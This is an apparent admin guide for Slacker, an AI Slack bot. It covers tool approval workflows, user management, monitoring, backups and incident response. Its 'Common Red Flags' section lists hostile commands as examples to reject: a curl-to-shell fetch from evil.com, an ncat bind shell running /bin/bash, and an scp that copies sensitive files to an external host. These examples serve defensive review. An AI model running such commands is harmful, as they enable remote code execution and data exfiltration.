# Slacker Admin Guide

This guide covers multi-tenant administration, user management, and operational procedures for Slacker, Marvin's enterprise-grade Slack bot.

## 🎯 **Admin Overview**

As a Slacker administrator, you are responsible for:
- **User Management**: Managing access and permissions
- **Tool Approval**: Reviewing and approving tool requests
- **Security Oversight**: Ensuring compliance and security policies
- **Operational Monitoring**: Maintaining system health and performance
- **User Support**: Assisting users with tool usage and issues

---

## 👥 **User Management**

### **Admin User Configuration**

Admin users are specified in the configuration file:

```hcl
multi_tenant {
  admin_users = ["U1234567890", "U0987654321"]  # Slack user IDs
  admin_channel = "CADMIN123"  # Optional admin notification channel
}
```

**Getting User IDs:**
1. In Slack, right-click on any user
2. Select **"Copy member ID"**
3. Paste into the `admin_users` array

### **Admin vs Regular Users**

| Feature | Admin Users | Regular Users |
|---------|-------------|---------------|
| **Tool Approval** | ✅ Can approve/reject | ❌ Cannot approve |
| **Admin Commands** | ✅ Full access | ❌ Limited access |
| **Tool Sharing** | ✅ Can share any tool | ⚠️ Only if permitted |
| **System Info** | ✅ Full visibility | ⚠️ Limited visibility |
| **User Management** | ✅ Can manage users | ❌ No access |

### **Admin Channel (Optional)**

Configure a dedicated admin channel for important notifications:

```hcl
multi_tenant {
  admin_channel = "CADMIN123"  # Channel ID
}
```

**Benefits:**
- Centralized admin notifications
- Collaboration on approvals
- System alerts and monitoring
- Audit trail discussions

---

## 🔧 **Tool Approval Workflow**

### **Approval Requirements by Tool Type**

| Tool Type | Approval Required | Risk Level | Typical Use Cases |
|------------|-------------------|------------|-------------------|
| `local_program` | **Yes** | High | System utilities, internal tools |
| `docker_mcp` | **Yes** | Medium | Third-party services, isolated tools |
| `mcp_over_http` | **No** | Low | Public APIs, cloud services |

### **Complete Approval Process**

#### **Phase 1: User Request**
User makes request via natural language:
```
@marvin-bot Add local tool at /usr/local/bin/company-api
```

**What happens:**
1. Bot parses tool configuration
2. Validates syntax and safety
3. Generates unique request ID
4. Stores approval request
5. Notifies all admin users
6. Confirms to user with request ID

#### **Phase 2: Admin Review**
Admins receive detailed DM notifications:

```
🔧 **Tool Approval Request**

**Requester:** @john.doe
**Tool Type:** local_program
**Tool ID:** user-123-local-20260210-150405
**Timestamp:** 2026-02-10 15:04:05

**Configuration:**
```json
{
  "Name": "company-api",
  "Command": "/usr/local/bin/company-api",
  "Args": ["--read-only"]
}
```

**To approve:** Reply with "Approve user-123-local-20260210-150405"
**To reject:** Reply with "Reject user-123-local-20260210-150405 because security policy"
```

#### **Phase 3: Approval Decision**

**Approving Tools:**
```bash
# Natural language approval
Approve user-123-local-20260210-150405

# Multiple tools at once
Approve user-123-local-20260210-150405 user-123-docker-20260210-150410
```

**Rejecting Tools:**
```bash
# With reason
Reject user-123-local-20260210-150405 because security policy violation

# Multiple tools with different reasons
Reject user-123-local-20260210-150405 because insufficient documentation
Reject user-123-docker-20260210-150410 because unauthorized image
```

### **Approval Best Practices**

#### **Security Checklist**
Before approving tools, verify:

1. **Source Verification**: Is the tool from a trusted source?
2. **Configuration Safety**: Are there any dangerous flags or parameters?
3. **Access Requirements**: Does the user really need this tool?
4. **Alternative Options**: Is there a safer HTTP-based alternative?
5. **Business Justification**: Is there a legitimate business need?

#### **Approval Guidelines**

**✅ APPROVE when:**
- Tool is from a trusted source
- Configuration is minimal and secure
- User has legitimate business need
- Tool follows company policies
- No safer alternatives exist

**❌ REJECT when:**
- Tool source is unknown or untrusted
- Configuration contains dangerous flags
- Request lacks clear business justification
- Tool violates security policies
- Safer alternatives are available

#### **Common Red Flags**

```
# Dangerous: Full system access
"/bin/bash" with args ["-c", "curl http://evil.com | sh"]

# Suspicious: Hardcoded credentials
env "API_KEY" with value "sk-1234567890abcdef"

# Risky: Unrestricted network access
"ncat" with args ["-l", "8080", "-e", "/bin/bash"]

# Concerning: Data exfiltration potential
"scp" with args ["-r", "/sensitive/*", "user@external.com:/data"]
```

---

## 📊 **User Support & Management**

### **User Onboarding**

#### **Initial Setup**
1. **Welcome Message**: New users get onboarding when they first interact
2. **Tool Discovery**: Users can list available tools
3. **Permission Check**: Users see their access level
4. **Training Resources**: Provide documentation links

#### **User Commands**
```
@marvin-bot List my tools           # Show available tools
@marvin-bot Show my permissions    # Display access level
@marvin-bot Help with tools         # Get usage guidance
@marvin-bot Share tool X with @user # Share permitted tools
```

### **Troubleshooting Common User Issues**

#### **User Can't Access Tools**
```
@marvin-bot List my tools
# Expected: Shows available tools
# Issue: No tools shown

Causes:
- User has no approved tools
- Tools expired or were revoked
- Session corruption
- User lacks required permissions

Solution:
- Check approval status: Check pending approvals for user
- Grant basic HTTP tools if appropriate
- Review user access level in configuration
```

#### **Tool Sharing Failures**
```
@marvin-bot Share weather-api with @new-user
# Expected: Tool shared successfully
# Issue: "Cannot share this tool"

Causes:
- Tool doesn't allow sharing
- Target user not in allowed_users list
- Admin has disabled sharing for this tool

Solution:
- Check tool configuration: can_share = true
- Verify target user permissions
- Admin can modify tool sharing settings
```

#### **Session Issues**
```
User reports: Bot doesn't remember previous conversations

Solutions:
1. Check session storage paths
2. Verify file permissions
3. Review session corruption logs
4. Consider session reset: Reset my session
```

### **User Communication Templates**

#### **Welcome Message**
```
👋 Welcome to Marvin Slacker!

I'm your AI assistant with access to various tools. Here's how to get started:

🔧 **Available Commands:**
• List my tools - See what you can use
• Add HTTP tool at URL - Add safe tools instantly
• Add local tool at PATH - Request admin approval

🛡️ **Need Help?**
• @marvin-bot Help - Get command assistance
• @admin-user - Contact an admin for tool requests

Let me know how I can help you today!
```

#### **Approval Status Updates**
```
📋 Your tool request status:

**Request ID:** user-123-local-20260210-150405
**Status:** ⏳ Pending admin review
**Submitted:** 2026-02-10 15:04:05
**Admins Notified:** ✅

I'll notify you as soon as an admin reviews your request. Typical response time is within business hours.
```

---

## 🔍 **Monitoring & Analytics**

### **Health Monitoring**

#### **System Health Metrics**
Monitor these key indicators:

1. **Connection Status**
   ```
   [DIAGNOSTIC] Bot Connected - BotID: U9876543210, User: marvin-bot, Team: T12345678/Your-Team
   ```

2. **Active Sessions**
   ```
   [DIAGNOSTIC] Session State - User: U123456, Channel: C123456, Total Sessions: 15
   ```

3. **Tool Usage**
   ```
   [INFO] Tool Execution - User: U123456, Tool: weather-api, Duration: 250ms
   ```

#### **Performance Monitoring**
```bash
# Enable verbose logging for detailed metrics
./slacker --config marvin.slacker.hcl --verbose

# Monitor log patterns
tail -f slacker.log | grep -E "(ERROR|WARNING|SECURITY)"
```

### **Security Analytics**

#### **Security Events to Monitor**
```
[SECURITY] Tool Request - User: U123456, Type: local, Command: /usr/bin/ls
[SECURITY] Tool Added - User: U123456, ToolID: user_U123456_github-api, Type: http
[SECURITY] Approval Required - ToolID: local-req-12345, Requester: U123456, Type: local
[SECURITY] Tool Approval - Admin: U789012, ToolID: local-req-12345, Decision: approved
[SECURITY] Tool Rejection - Admin: U789012, ToolID: docker-req-12346, Decision: rejected
```

#### **Suspicious Activity Indicators**
- Multiple tool requests in short time
- Requests for dangerous tools
- Repeated rejected requests
- Requests outside business hours
- Unusual command patterns

#### **Audit Trail Management**
```bash
# Archive old security logs
find /var/log/slacker -name "*.log" -mtime +30 -exec gzip {} \;

# Generate daily security summary
grep "\[SECURITY\]" slacker.log | grep "$(date +%Y-%m-%d)" | wc -l
```

### **Usage Analytics**

#### **Popular Tools Report**
```bash
# Extract tool usage statistics
grep "Tool Execution" slacker.log | \
  awk '{print $6}' | sort | uniq -c | sort -nr
```

#### **User Engagement**
```bash
# Active users by day
grep "Session State" slacker.log | \
  grep "$(date +%Y-%m-%d)" | awk '{print $4}' | sort | uniq
```

---

## ⚙️ **Administrative Operations**

### **Configuration Management**

#### **Dynamic Updates**
Most configuration changes require bot restart, but some can be updated dynamically:

```bash
# Reload configuration (if supported)
./slacker --config marvin.slacker.hcl --reload-config

# Update admin users without restart
./slacker --config marvin.slacker.hcl --update-admins "U123456,U098765432"
```

#### **Configuration Validation**
```bash
# Validate configuration before deployment
./slacker --config marvin.slacker.hcl --validate-config

# Test configuration with dry run
./slacker --config marvin.slacker.hcl --dry-run
```

### **Backup and Recovery**

#### **Backup Critical Data**
```bash
# Backup session data
tar -czf sessions-backup-$(date +%Y%m%d).tar.gz ./sessions/

# Backup credential storage
tar -czf credentials-backup-$(date +%Y%m%d).tar.gz ./credentials/

# Backup configuration
cp marvin.slacker.hcl marvin.slacker.backup-$(date +%Y%m%d).hcl
```

#### **Recovery Procedures**
```bash
# Restore sessions
tar -xzf sessions-backup-20260210.tar.gz

# Restore credentials (requires same passphrase)
tar -xzf credentials-backup-20260210.tar.gz

# Verify permissions
chmod 700 sessions credentials
```

### **Maintenance Tasks**

#### **Session Cleanup**
```bash
# Clean old inactive sessions (example: older than 30 days)
find ./sessions -name "session_*.json" -mtime +30 -delete

# Cleanup orphaned approval requests
find ./sessions -name "approval_*.json" -mtime +7 -delete
```

#### **Log Rotation**
```bash
# Rotate large log files
if [ -f slacker.log ] && [ $(stat -f%z slacker.log) -gt 100000000 ]; then
    mv slacker.log slacker.log.$(date +%Y%m%d)
    touch slacker.log
fi
```

---

## 🚨 **Incident Response**

### **Security Incident Types**

#### **Unauthorized Tool Access**
**Symptoms:**
- Reports of tools being used by unauthorized users
- Unexpected tool execution logs
- User complaints about missing tools

**Response:**
1. **Isolate**: Check current user permissions
2. **Investigate**: Review approval logs and timestamps
3. **Remediate**: Revoke suspicious tool access
4. **Monitor**: Increase logging frequency
5. **Report**: Document incident and response

#### **Credential Compromise**
**Symptoms:**
- Bot tokens appearing in unauthorized systems
- Unusual activity patterns
- Failed authentication attempts

**Response:**
1. **Rotate**: Immediately regenerate Slack tokens
2. **Investigate**: Check for data exposure
3. **Notify**: Alert affected users
4. **Audit**: Review access logs
5. **Strengthen**: Implement additional security measures

#### **System Outage**
**Symptoms:**
- Bot appears offline
- No response to mentions
- Connection errors in logs

**Response:**
1. **Diagnose**: Check logs and system status
2. **Restart**: Restart bot service if needed
3. **Verify**: Test basic functionality
4. **Communicate**: Notify users of downtime
5. **Monitor**: Watch for recurrence

### **Emergency Procedures**

#### **Immediate Bot Shutdown**
```bash
# Emergency stop (preserves state)
pkill -INT slacker

# Force stop (last resort)
pkill -KILL slacker
```

#### **Emergency User Lockdown**
```hcl
# Emergency configuration - remove all users except admins
multi_tenant {
  admin_users = ["U1234567890"]  # Only primary admin
  emergency_mode = true
}
```

---

## 📈 **Scaling and Capacity Planning**

### **Performance Monitoring**

#### **Resource Usage**
```bash
# Monitor CPU and memory usage
top -p $(pgrep slacker)

# Check file descriptor usage
lsof -p $(pgrep slacker) | wc -l

# Monitor network connections
netstat -an | grep $(pgrep slacker)
```

#### **Scaling Considerations**

**When to Scale Up:**
- Active users > 100
- Concurrent sessions > 50
- Response times > 2 seconds
- Memory usage > 2GB

**Scaling Strategies:**
- **Vertical Scaling**: More CPU/memory for single instance
- **Horizontal Scaling**: Multiple bot instances with load balancing
- **Resource Optimization**: Increase Ollama performance, optimize configuration

---

## 🎯 **Admin Best Practices**

### **Daily Tasks**
- [ ] Review security logs for suspicious activity
- [ ] Check pending tool approvals
- [ ] Monitor bot health and performance
- [ ] Respond to user questions and issues

### **Weekly Tasks**
- [ ] Review tool usage analytics
- [ ] Update user access as needed
- [ ] Backup configuration and data
- [ ] Rotate security credentials if required

### **Monthly Tasks**
- [ ] Audit all approved tools and permissions
- [ ] Review and update security policies
- [ ] Performance analysis and optimization
- [ ] User training and documentation updates

### **Policies and Procedures**

**Tool Approval Policy:**
- Document approval criteria and process
- Define role-based access controls
- Establish review timelines (SLAs)
- Create escalation procedures

**Security Policy:**
- Define acceptable tool types
- Establish monitoring requirements
- Create incident response procedures
- Document compliance requirements

**User Management Policy:**
- Define onboarding/offboarding procedures
- Establish access review schedules
- Create user support procedures
- Document communication protocols

---

## 📚 **Additional Resources**

- [Setup Guide](setup.md) - Initial bot configuration
- [Security Guide](security.md) - Security best practices
- [Tool Management Guide](tools-management.md) - Advanced tool configuration
- [Deployment Guide](../deployment/kubernetes.md) - Production deployment
- [Troubleshooting](../configuration/troubleshooting.md) - Common issues and solutions

Remember: As an admin, you are the guardian of system security and user experience. Stay vigilant, document your decisions, and always prioritize security and user privacy.